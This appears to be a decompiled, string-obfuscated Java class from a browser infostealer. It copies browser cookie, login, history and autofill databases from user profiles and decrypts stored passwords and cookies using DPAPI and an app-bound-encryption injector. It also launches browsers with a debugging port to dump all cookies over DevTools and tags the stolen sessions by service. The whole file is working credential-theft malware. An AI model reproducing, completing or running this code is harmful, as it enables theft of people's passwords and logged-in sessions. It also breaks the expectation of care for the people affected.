/*
 * Decompiled with CFR 0.152.
 */
package x;

import aether.browser.AbeInjector;
import aether.browser.DpapiDecryptor;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.File;
import java.net.ServerSocket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public final class l {
    private static final String[][] a = new String[][]{{$S.d(113), $S.d(114)}, {$S.d(115), $S.d(116)}, {$S.d(117), $S.d(118)}, {$S.d(119), $S.d(120)}, {$S.d(121), $S.d(122)}, {$S.d(123), $S.d(124)}, {$S.d(125), $S.d(126)}, {$S.d(127), $S.d(128)}, {$S.d(129), $S.d(130)}, {$S.d(131), $S.d(132)}, {$S.d(133), $S.d(134)}, {$S.d(135), $S.d(136)}, {$S.d(137), $S.d(138)}, {$S.d(139), $S.d(138)}, {$S.d(140), $S.d(141)}, {$S.d(142), $S.d(143)}, {$S.d(144), $S.d(145)}, {$S.d(146), $S.d(147)}, {$S.d(148), $S.d(149)}, {$S.d(150), $S.d(151)}, {$S.d(152), $S.d(153)}, {$S.d(154), $S.d(155)}, {$S.d(156), $S.d(157)}, {$S.d(158), $S.d(159)}, {$S.d(160), $S.d(161)}, {$S.d(162), $S.d(163)}, {$S.d(164), $S.d(165)}, {$S.d(166), $S.d(167)}, {$S.d(168), $S.d(169)}, {$S.d(170), $S.d(171)}, {$S.d(172), $S.d(173)}, {$S.d(174), $S.d(175)}, {$S.d(176), $S.d(177)}, {$S.d(178), $S.d(179)}, {$S.d(180), $S.d(181)}, {$S.d(182), $S.d(183)}, {$S.d(184), $S.d(185)}, {$S.d(186), "EA"}, {$S.d(187), $S.d(188)}, {$S.d(189), $S.d(190)}, {$S.d(191), $S.d(192)}, {$S.d(193), $S.d(194)}, {$S.d(195), $S.d(196)}, {$S.d(197), $S.d(198)}, {$S.d(199), $S.d(200)}, {$S.d(201), $S.d(202)}};
    private static final Map<String, String> b = new LinkedHashMap<String, String>();
    private static final Map<String, String> c = new LinkedHashMap<String, String>();
    private static final Set<String> d = new HashSet<String>(Arrays.asList($S.d(203), $S.d(204), $S.d(205), $S.d(206), $S.d(207), $S.d(208), $S.d(209), $S.d(210)));
    private static volatile boolean e;
    private static final OkHttpClient f;
    private static boolean g;

    private static String a(String ... stringArray) {
        for (String string : stringArray) {
            if (string == null || string.isEmpty() || !new File(string).isFile()) continue;
            return string;
        }
        return null;
    }

    private static int a() {
        int n2;
        ServerSocket serverSocket = new ServerSocket(0);
        try {
            serverSocket.setReuseAddress(true);
            n2 = serverSocket.getLocalPort();
        }
        catch (Throwable throwable) {
            try {
                try {
                    serverSocket.close();
                }
                catch (Throwable throwable2) {
                    throwable.addSuppressed(throwable2);
                }
                throw throwable;
            }
            catch (Exception exception) {
                return 9222 + new Random().nextInt(1000);
            }
        }
        serverSocket.close();
        return n2;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static String a(int n2) {
        int n3 = 0;
        while (n3 < 20) {
            try {
                Thread.sleep(500L);
                Object object = new Request.Builder().url($S.d(1) + n2 + $S.d(2)).build();
                object = f.newCall((Request)object).execute();
                try {
                    if (((Response)object).isSuccessful() && ((Response)object).body() != null) {
                        Object object2 = ((Response)object).body().string();
                        JsonElement jsonElement = JsonParser.parseString((String)object2).getAsJsonArray();
                        object2 = ((JsonArray)jsonElement).iterator();
                        while (object2.hasNext()) {
                            jsonElement = (JsonElement)object2.next();
                            if (!((JsonObject)(jsonElement = jsonElement.getAsJsonObject())).has($S.d(3)) || !$S.d(4).equals(((JsonObject)jsonElement).get($S.d(3)).getAsString()) || !((JsonObject)jsonElement).has($S.d(5))) continue;
                            object2 = ((JsonObject)jsonElement).get($S.d(5)).getAsString();
                            return object2;
                        }
                    }
                }
                finally {
                    if (object != null) {
                        ((Response)object).close();
                    }
                }
            }
            catch (Exception exception) {}
            ++n3;
        }
        return null;
    }

    private static List<c> a(String iterator2) {
        if (iterator2 == null) {
            return Collections.emptyList();
        }
        Object object = new CountDownLatch(1);
        Object object2 = new AtomicReference();
        Object object3 = new OkHttpClient.Builder().readTimeout(15L, TimeUnit.SECONDS).build();
        iterator2 = new Request.Builder().url((String)((Object)iterator2)).build();
        iterator2 = ((OkHttpClient)object3).newWebSocket((Request)((Object)iterator2), new WebSocketListener((AtomicReference)object2, (CountDownLatch)object){
            private /* synthetic */ AtomicReference a;
            private /* synthetic */ CountDownLatch b;
            {
                this.a = atomicReference;
                this.b = countDownLatch;
            }

            @Override
            public final void onOpen(WebSocket webSocket, Response response) {
                webSocket.send($S.d(0));
            }

            @Override
            public final void onMessage(WebSocket webSocket, String string) {
                try {
                    JsonObject jsonObject = JsonParser.parseString(string).getAsJsonObject();
                    if (jsonObject.has("id") && jsonObject.get("id").getAsInt() == 1) {
                        this.a.set(string);
                        this.b.countDown();
                        webSocket.close(1000, null);
                    }
                    return;
                }
                catch (Exception exception) {
                    return;
                }
            }

            @Override
            public final void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                this.b.countDown();
            }
        });
        try {
            ((CountDownLatch)object).await(15L, TimeUnit.SECONDS);
        }
        catch (InterruptedException interruptedException) {}
        iterator2.cancel();
        ((OkHttpClient)object3).dispatcher().executorService().shutdown();
        ((OkHttpClient)object3).connectionPool().evictAll();
        iterator2 = (String)((AtomicReference)object2).get();
        if (iterator2 == null) {
            return Collections.emptyList();
        }
        object = new ArrayList();
        try {
            iterator2 = JsonParser.parseString((String)((Object)iterator2)).getAsJsonObject();
            if ((iterator2 = ((JsonObject)((Object)iterator2)).has($S.d(6)) ? ((JsonObject)((Object)iterator2)).getAsJsonObject($S.d(6)) : null) == null || !((JsonObject)((Object)iterator2)).has($S.d(7))) {
                return object;
            }
            iterator2 = ((JsonObject)((Object)iterator2)).getAsJsonArray($S.d(7));
            iterator2 = ((JsonArray)((Object)iterator2)).iterator();
            while (iterator2.hasNext()) {
                object2 = iterator2.next();
                try {
                    object2 = ((JsonElement)object2).getAsJsonObject();
                    object3 = new c();
                    new c().a = l.a((JsonObject)object2, $S.d(8));
                    ((c)object3).b = l.a((JsonObject)object2, $S.d(9));
                    ((c)object3).c = l.a((JsonObject)object2, $S.d(10));
                    ((c)object3).d = ((JsonObject)object2).has($S.d(11)) ? ((JsonObject)object2).get($S.d(11)).getAsString() : "/";
                    ((c)object3).e = ((JsonObject)object2).has($S.d(12)) && ((JsonObject)object2).get($S.d(12)).getAsBoolean();
                    double d2 = ((JsonObject)object2).has($S.d(13)) && !((JsonObject)object2).get($S.d(13)).isJsonNull() ? ((JsonObject)object2).get($S.d(13)).getAsDouble() : 0.0;
                    long l2 = ((c)object3).f = d2 > 0.0 ? (long)((d2 + 1.16444736E10) * 1000000.0) : 0L;
                    if (((c)object3).c.isEmpty()) continue;
                    object.add(object3);
                }
                catch (Exception exception) {}
            }
        }
        catch (Exception exception) {}
        return object;
    }

    private static String a(JsonObject jsonObject, String string) {
        try {
            if (jsonObject.has(string) && !jsonObject.get(string).isJsonNull()) {
                return jsonObject.get(string).getAsString();
            }
            return "";
        }
        catch (Exception exception) {
            return "";
        }
    }

    /*
     * Loose catch block
     */
    private static List<c> a(String list2, String stringArray, String string) {
        Process process;
        block15: {
            if (list2 == null || !new File((String)((Object)list2)).isFile()) {
                return Collections.emptyList();
            }
            int n2 = l.a();
            process = null;
            String[] stringArray2 = stringArray;
            String[] stringArray3 = new String[]{(String)stringArray2 + $S.d(14), (String)stringArray2 + $S.d(15), (String)stringArray2 + $S.d(16), (String)stringArray2 + $S.d(17)};
            stringArray2 = stringArray3;
            stringArray2 = stringArray3;
            int cfr_ignored_0 = stringArray3.length;
            for (int i2 = 0; i2 < 4; ++i2) {
                String string2 = stringArray2[i2];
                try {
                    new File(string2).delete();
                    continue;
                }
                catch (Exception exception) {}
            }
            list2 = new ArrayList<String>(Arrays.asList(list2, $S.d(18), $S.d(19), $S.d(20), $S.d(21), $S.d(22), $S.d(23), $S.d(24), $S.d(25), $S.d(26), $S.d(27), $S.d(28) + n2, $S.d(29), $S.d(30) + (String)stringArray, $S.d(31) + string, $S.d(32), $S.d(33)));
            list2 = new ProcessBuilder(list2);
            ((ProcessBuilder)((Object)list2)).redirectOutput(ProcessBuilder.Redirect.to(new File(System.getProperty($S.d(34), "").toLowerCase().startsWith($S.d(35)) ? $S.d(36) : $S.d(37))));
            ((ProcessBuilder)((Object)list2)).redirectError(ProcessBuilder.Redirect.to(new File(System.getProperty($S.d(34), "").toLowerCase().startsWith($S.d(35)) ? $S.d(36) : $S.d(37))));
            process = ((ProcessBuilder)((Object)list2)).start();
            list2 = l.a(n2);
            list2 = l.a((String)((Object)list2));
            if (process == null) break block15;
            process.destroyForcibly();
        }
        try {
            Thread.sleep(500L);
        }
        catch (Exception exception) {}
        return list2;
        catch (Exception exception) {
            block16: {
                try {
                    list2 = Collections.emptyList();
                    if (process == null) break block16;
                    process.destroyForcibly();
                }
                catch (Throwable throwable) {
                    if (process != null) {
                        process.destroyForcibly();
                    }
                    try {
                        Thread.sleep(500L);
                    }
                    catch (Exception exception2) {}
                    throw throwable;
                }
            }
            try {
                Thread.sleep(500L);
            }
            catch (Exception exception3) {}
            return list2;
        }
    }

    public static List<b> a(boolean bl, boolean bl2, boolean bl3, boolean bl4) {
        Object object;
        Object object2 = $S.d(38);
        String string = $S.d(39);
        String object32 = $S.d(40);
        String string2 = $S.d(41);
        Object object3 = $S.d(42);
        Object object4 = new String[]{$S.d(43), $S.d(44), $S.d(45), $S.d(46), $S.d(47), $S.d(48), $S.d(49), $S.d(50), $S.d(51), $S.d(52), $S.d(53), $S.d(54), $S.d(55)};
        int cfr_ignored_0 = ((String[])object4).length;
        for (int i2 = 0; i2 < 13; ++i2) {
            object = object4[i2];
            try {
                object = $S.d(56) + (String)object + "'";
                object = Runtime.getRuntime().exec(new String[]{object2, string, object32, object, string2, object3});
                ((Process)object).waitFor(600L, TimeUnit.MILLISECONDS);
                continue;
            }
            catch (Exception exception) {}
        }
        try {
            Thread.sleep(2500L);
        }
        catch (Exception exception) {}
        object2 = new ArrayList();
        for (Map.Entry entry : b.entrySet()) {
            Object object5;
            String string3;
            string2 = (String)entry.getKey();
            String string4 = (String)entry.getValue();
            object3 = new File(string4);
            if (!((File)object3).exists()) {
                string3 = $S.d(57) + string2 + $S.d(58);
                continue;
            }
            object3 = new ArrayList<String>();
            object3.add($S.d(59));
            for (int i3 = 1; i3 <= 10; ++i3) {
                if (!new File(string4, $S.d(60) + i3).exists()) continue;
                object3.add($S.d(60) + i3);
            }
            string3 = string2 + $S.d(61) + object3;
            object4 = string4 + $S.d(62);
            byte[] byArray = null;
            object = null;
            try {
                byArray = DpapiDecryptor.b((String)object4);
            }
            catch (Throwable throwable) {
                string3 = string2 + $S.d(63) + throwable;
            }
            if (AbeInjector.a((String)object4)) {
                object5 = c.get(string2);
                if (object5 != null) {
                    try {
                        object = AbeInjector.a((String)object5, (String)object4);
                        string3 = string2 + $S.d(64);
                    }
                    catch (Throwable throwable) {
                        string3 = string2 + $S.d(65) + throwable.getMessage() + $S.d(66);
                        try {
                            object = DpapiDecryptor.a((String)object4);
                        }
                        catch (Throwable throwable2) {
                            string3 = string2 + $S.d(67) + throwable2;
                        }
                    }
                } else {
                    try {
                        object = DpapiDecryptor.a((String)object4);
                    }
                    catch (Throwable throwable) {
                        string3 = string2 + $S.d(67) + throwable;
                    }
                }
            }
            string3 = string2 + $S.d(68) + (byArray != null ? byArray.length + "b" : $S.d(69)) + $S.d(70) + (object != null ? ((Object)object).length + "b" : $S.d(69));
            object5 = object3.iterator();
            while (object5.hasNext()) {
                Object object6;
                String string5 = (String)object5.next();
                object4 = new File(string4, string5);
                if (!((File)object4).exists()) continue;
                object3 = new b();
                new b().a = string2;
                ((b)object3).b = string5;
                if (bl) {
                    object6 = object != null ? object : (Object)byArray;
                    if (object6 != null) {
                        ((b)object3).c = l.a(((File)object4).getAbsolutePath(), byArray, (byte[])object);
                        string3 = string2 + "/" + string5 + $S.d(71) + ((b)object3).c.size();
                    }
                    if (((b)object3).c.isEmpty() && d.contains(string2)) {
                        object6 = c.get(string2);
                        if (object6 != null) {
                            string3 = string2 + "/" + string5 + $S.d(72) + (String)object6;
                            ((b)object3).c = l.a((String)object6, string4, string5);
                            string3 = string2 + "/" + string5 + $S.d(73) + ((b)object3).c.size();
                        } else {
                            string3 = string2 + $S.d(74);
                        }
                    }
                }
                if (bl2 && (object6 = object != null ? object : (Object)byArray) != null) {
                    ((b)object3).d = l.b(((File)object4).getAbsolutePath(), byArray, (byte[])object);
                }
                if (bl3) {
                    ((b)object3).e = l.b(((File)object4).getAbsolutePath());
                }
                if (bl4) {
                    ((b)object3).f = l.c(((File)object4).getAbsolutePath());
                }
                if (((b)object3).c.isEmpty() && ((b)object3).d.isEmpty() && ((b)object3).e.isEmpty() && ((b)object3).f.isEmpty()) continue;
                object2.add(object3);
            }
        }
        return object2;
    }

    public static List<String> a(List<b> arrayList, boolean bl) {
        LinkedHashSet<String> linkedHashSet = new LinkedHashSet<String>();
        for (b b2 : arrayList) {
            List<Object> list2 = bl ? b2.c : b2.d;
            block1: for (Object object : list2) {
                object = bl ? ((c)object).a : ((e)object).a;
                if (object == null) continue;
                object = ((String)object).toLowerCase();
                String[][] stringArray = a;
                int n2 = a.length;
                for (int i2 = 0; i2 < n2; ++i2) {
                    String[] stringArray2 = stringArray[i2];
                    if (!((String)object).contains(stringArray2[0])) continue;
                    linkedHashSet.add(stringArray2[1]);
                    continue block1;
                }
            }
        }
        arrayList = new ArrayList<String>(linkedHashSet);
        Collections.sort(arrayList);
        return arrayList;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static List<c> a(String object, byte[] byArray, byte[] byArray2) {
        ArrayList<c> arrayList = new ArrayList<c>();
        Object object2 = (String)object + $S.d(75);
        if (!new File((String)object2).exists()) {
            object2 = (String)object + $S.d(76);
        }
        if (!new File((String)object2).exists()) {
            return arrayList;
        }
        object = l.a((String)object2, $S.d(77));
        if (object == null) {
            return arrayList;
        }
        try {
            object2 = DriverManager.getConnection($S.d(78) + ((File)object).getAbsolutePath());
            try {
                Object object3 = $S.d(79);
                try (PreparedStatement preparedStatement = object2.prepareStatement((String)object3);){
                    object3 = preparedStatement.executeQuery();
                    try {
                        while (object3.next()) {
                            try {
                                c c2 = new c();
                                new c().a = object3.getString($S.d(80));
                                c2.b = object3.getString($S.d(9));
                                c2.d = object3.getString($S.d(11));
                                c2.e = c2.a != null && c2.a.startsWith(".");
                                c2.f = object3.getLong($S.d(81));
                                byte[] byArray3 = object3.getBytes($S.d(82));
                                c2.c = DpapiDecryptor.b(byArray3, byArray, byArray2);
                                if (c2.c == null || c2.c.isEmpty()) continue;
                                arrayList.add(c2);
                            }
                            catch (Exception exception) {}
                        }
                        return arrayList;
                    }
                    finally {
                        if (object3 != null) {
                            object3.close();
                        }
                    }
                }
            }
            finally {
                if (object2 != null) {
                    object2.close();
                }
            }
        }
        catch (Exception exception) {
            return arrayList;
        }
        finally {
            ((File)object).delete();
            new File(((File)object).getAbsolutePath() + $S.d(83)).delete();
            new File(((File)object).getAbsolutePath() + $S.d(84)).delete();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static List<e> b(String object, byte[] byArray, byte[] byArray2) {
        ArrayList<e> arrayList = new ArrayList<e>();
        if (!new File((String)(object = (String)object + $S.d(85))).exists()) {
            return arrayList;
        }
        if ((object = l.a((String)object, $S.d(86))) == null) {
            return arrayList;
        }
        try (Connection connection = DriverManager.getConnection($S.d(78) + ((File)object).getAbsolutePath());){
            Object object2 = $S.d(87);
            try (PreparedStatement preparedStatement = connection.prepareStatement((String)object2);){
                object2 = preparedStatement.executeQuery();
                try {
                    while (object2.next()) {
                        try {
                            e e2 = new e();
                            new e().a = object2.getString($S.d(88));
                            e2.b = object2.getString($S.d(89));
                            byte[] byArray3 = object2.getBytes($S.d(90));
                            e2.c = DpapiDecryptor.a(byArray3, byArray, byArray2);
                            if (e2.c == null || e2.c.isEmpty()) continue;
                            arrayList.add(e2);
                        }
                        catch (Exception exception) {}
                    }
                    return arrayList;
                }
                finally {
                    if (object2 != null) {
                        object2.close();
                    }
                }
            }
        }
        catch (Exception exception) {
            return arrayList;
        }
        finally {
            ((File)object).delete();
            new File(((File)object).getAbsolutePath() + $S.d(83)).delete();
            new File(((File)object).getAbsolutePath() + $S.d(84)).delete();
        }
    }

    private static List<d> b(String object) {
        ArrayList<d> arrayList = new ArrayList<d>();
        if (!new File((String)(object = (String)object + $S.d(91))).exists()) {
            return arrayList;
        }
        if ((object = l.a((String)object, $S.d(92))) == null) {
            return arrayList;
        }
        try (Connection connection = DriverManager.getConnection($S.d(78) + ((File)object).getAbsolutePath());){
            Object object2 = $S.d(93);
            try (PreparedStatement preparedStatement = connection.prepareStatement((String)object2);){
                object2 = preparedStatement.executeQuery();
                try {
                    while (object2.next()) {
                        try {
                            d d2 = new d();
                            new d().a = object2.getString($S.d(94));
                            d2.b = object2.getString($S.d(95));
                            d2.c = object2.getLong($S.d(96));
                            arrayList.add(d2);
                        }
                        catch (Exception exception) {}
                    }
                }
                finally {
                    if (object2 != null) {
                        object2.close();
                    }
                }
            }
        }
        catch (Exception exception) {
        }
        finally {
            ((File)object).delete();
            new File(((File)object).getAbsolutePath() + $S.d(83)).delete();
            new File(((File)object).getAbsolutePath() + $S.d(84)).delete();
        }
        return arrayList;
    }

    public static String a(List<c> object) {
        StringBuilder stringBuilder = new StringBuilder($S.d(97));
        object = object.iterator();
        while (object.hasNext()) {
            c c2 = (c)object.next();
            long l2 = c2.f > 0L ? c2.f / 1000000L - 11644473600L : 0L;
            stringBuilder.append(String.format($S.d(98), c2.a, c2.d, c2.e ? $S.d(99) : $S.d(100), l2, c2.b, c2.c != null ? c2.c : ""));
        }
        return stringBuilder.toString();
    }

    public static String b(List<e> object) {
        StringBuilder stringBuilder = new StringBuilder();
        object = object.iterator();
        while (object.hasNext()) {
            e e2 = (e)object.next();
            stringBuilder.append($S.d(101)).append(e2.a).append("\n");
            stringBuilder.append($S.d(102)).append(e2.b).append("\n");
            stringBuilder.append($S.d(103)).append(e2.c).append("\n");
            stringBuilder.append($S.d(104));
        }
        return stringBuilder.toString();
    }

    public static String c(List<d> object) {
        StringBuilder stringBuilder = new StringBuilder();
        object = object.iterator();
        while (object.hasNext()) {
            d d2 = (d)object.next();
            stringBuilder.append($S.d(105)).append(d2.a).append("\n");
            stringBuilder.append($S.d(106)).append(d2.b).append("\n");
            stringBuilder.append($S.d(107)).append(d2.c).append("\n");
            stringBuilder.append($S.d(104));
        }
        return stringBuilder.toString();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static List<a> c(String object) {
        ArrayList<a> arrayList = new ArrayList<a>();
        if (!new File((String)(object = (String)object + $S.d(108))).exists()) {
            return arrayList;
        }
        if ((object = l.a((String)object, $S.d(109))) == null) {
            return arrayList;
        }
        try (Connection connection = DriverManager.getConnection($S.d(78) + ((File)object).getAbsolutePath());){
            Object object2 = $S.d(110);
            try (PreparedStatement preparedStatement = connection.prepareStatement((String)object2);){
                object2 = preparedStatement.executeQuery();
                try {
                    while (object2.next()) {
                        try {
                            a a2 = new a();
                            new a().a = object2.getString($S.d(9));
                            a2.b = object2.getString($S.d(10));
                            if (a2.a == null || a2.a.isEmpty() || a2.b == null || a2.b.isEmpty()) continue;
                            arrayList.add(a2);
                        }
                        catch (Exception exception) {}
                    }
                    return arrayList;
                }
                finally {
                    if (object2 != null) {
                        object2.close();
                    }
                }
            }
        }
        catch (Exception exception) {
            return arrayList;
        }
        finally {
            ((File)object).delete();
            new File(((File)object).getAbsolutePath() + $S.d(83)).delete();
            new File(((File)object).getAbsolutePath() + $S.d(84)).delete();
        }
    }

    public static String d(List<a> object) {
        StringBuilder stringBuilder = new StringBuilder($S.d(111));
        object = object.iterator();
        while (object.hasNext()) {
            a a2 = (a)object.next();
            stringBuilder.append(a2.a).append("\t").append(a2.b).append("\n");
        }
        return stringBuilder.toString();
    }

    private static File a(String object, String object2) {
        try {
            object2 = File.createTempFile($S.d(112), (String)object2);
            ((File)object2).deleteOnExit();
            Files.copy(Paths.get((String)object, new String[0]), ((File)object2).toPath(), StandardCopyOption.REPLACE_EXISTING);
            File file = new File((String)object + $S.d(83));
            object = new File((String)object + $S.d(84));
            if (file.exists()) {
                try {
                    Files.copy(file.toPath(), Paths.get(((File)object2).getAbsolutePath() + $S.d(83), new String[0]), StandardCopyOption.REPLACE_EXISTING);
                }
                catch (Exception exception) {}
            }
            if (((File)object).exists()) {
                try {
                    Files.copy(((File)object).toPath(), Paths.get(((File)object2).getAbsolutePath() + $S.d(84), new String[0]), StandardCopyOption.REPLACE_EXISTING);
                }
                catch (Exception exception) {}
            }
            return object2;
        }
        catch (Exception exception) {
            return null;
        }
    }

    static {
        String string = System.getenv($S.d(211));
        String string2 = System.getenv($S.d(212));
        String string3 = System.getenv($S.d(213));
        String string4 = System.getenv($S.d(214));
        if (string != null) {
            b.put($S.d(203), string + $S.d(215));
            b.put($S.d(204), string + $S.d(216));
            b.put($S.d(205), string + $S.d(217));
            b.put($S.d(206), string + $S.d(218));
            b.put($S.d(219), string + $S.d(220));
            b.put($S.d(207), string + $S.d(221));
            b.put($S.d(210), string + $S.d(222));
            c.put($S.d(203), l.a(new String[]{string + $S.d(223), (string3 != null ? string3 : "") + $S.d(223), (string4 != null ? string4 : "") + $S.d(223)}));
            c.put($S.d(204), l.a(new String[]{(string4 != null ? string4 : "") + $S.d(224), (string3 != null ? string3 : "") + $S.d(224)}));
            c.put($S.d(205), l.a(new String[]{string + $S.d(225), (string3 != null ? string3 : "") + $S.d(225)}));
            c.put($S.d(208), l.a(new String[]{string + $S.d(226)}));
            c.put($S.d(209), l.a(new String[]{string + $S.d(227)}));
            c.put($S.d(206), l.a(new String[]{string + $S.d(228)}));
            c.put($S.d(207), l.a(new String[]{string + $S.d(229)}));
        }
        if (string2 != null) {
            b.put($S.d(208), string2 + $S.d(230));
            b.put($S.d(209), string2 + $S.d(231));
        }
        e = false;
        f = new OkHttpClient.Builder().connectTimeout(5L, TimeUnit.SECONDS).readTimeout(5L, TimeUnit.SECONDS).build();
        g = false;
    }

    public static final class c {
        public String a;
        public String b;
        public String c;
        public String d;
        public boolean e;
        public long f;
    }

    public static final class b {
        public String a;
        public String b;
        public List<c> c = new ArrayList<c>();
        public List<e> d = new ArrayList<e>();
        public List<d> e = new ArrayList<d>();
        public List<a> f = new ArrayList<a>();
    }

    public static final class e {
        public String a;
        public String b;
        public String c;
    }

    public static final class d {
        public String a;
        public String b;
        public long c;
    }

    public static final class a {
        public String a;
        public String b;
    }
}

